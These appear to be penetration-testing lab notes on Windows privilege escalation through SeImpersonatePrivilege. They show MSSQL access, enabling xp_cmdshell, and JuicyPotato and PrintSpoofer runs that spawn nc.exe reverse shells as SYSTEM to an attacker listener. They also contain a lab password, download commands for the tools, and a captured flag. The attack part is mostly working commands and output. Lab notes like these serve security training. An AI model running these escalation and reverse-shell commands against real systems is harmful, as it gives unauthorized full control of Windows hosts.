# SeImpersonate and SeAssignPrimaryToken

In Windows, every process has a token that has information about the account that is running it. 
To utilize the token, the SeImpersonate privilege is needed. 

It is only given to administrative accounts, and in most cases, can be removed during system hardening. 

--> Legitimate programs may utilize another process's token to escalate from Administrator to Local System

## SeImpersonate Example - JuicyPotato

1) Connecting with MSSQLClient.py

```
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

2) Enabling xp_cmdshell

```
enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
```

3) Confirming Access

```
xp_cmdshell whoami

output                                                                             

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress01
```

4) Checking Account Privileges

```
xp_cmdshell whoami /priv

output                                                                             

--------------------------------------------------------------------------------   
                                                                    
PRIVILEGES INFORMATION                                                             

----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
```

5) Catching SYSTEM Shell

```
sudo nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami

whoami
nt authority\system


C:\Windows\system32>hostname

hostname
WINLPE-SRV01
```

6) Escalating Privileges Using JuicyPotato

Download the JuicyPotato.exe binary and upload this and nc.exe to the target server

```
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

output                                                                             

--------------------------------------------------------------------------------   

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375                               
                                                                            
[+] authresult 0                                                                   
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                                    
[+] CreateProcessWithTokenW OK                                                     
[+] calling 0x000000000088ce08
```

## PrintSpoofer and RoguePotato

1) Escalating Privileges using PrintSpoofer

```
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL 
```

2) Catching Reverse Shell as SYSTEM

```
nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami

whoami
nt authority\system
```

## LAB

1) Connecting with MSSQLClient.py

```
mssqlclient.py sql_dev@10.129.43.43 -windows-auth
Str0ng_P@ssw0rd!
```

2) Enabling xp_cmdshell

```
enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.


```

3) Confirming Access

```
xp_cmdshell whoami

output                          
-----------------------------   
nt service\mssql$sqlexpress01   

NULL                            



```

4) Checking Account Privileges

```
xp_cmdshell whoami /priv

output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               

PRIVILEGES INFORMATION                                                             

----------------------                                                             

NULL                                                                               

Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   

NULL                                                                               

```

5) Catching SYSTEM Shell

```
sudo nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>type c:\Users\Administrator\Desktop\SeImpersonate\flag.txt
F3ar_th3_p0tato!

```

6) Escalating Privileges Using JuicyPotato

Download the JuicyPotato.exe binary and upload this and nc.exe to the target server
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
git clone https://github.com/int0x33/nc.exe/
git clone https://github.com/dievus/printspoofer.git

xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.211 8443 -e cmd.exe" -t *

output                                                       
----------------------------------------------------------   
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375         

......                                                       

[+] authresult 0                                             

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM   

NULL                                                         

[+] CreateProcessWithTokenW OK                               

[+] calling 0x000000000088ce08                               

NULL    

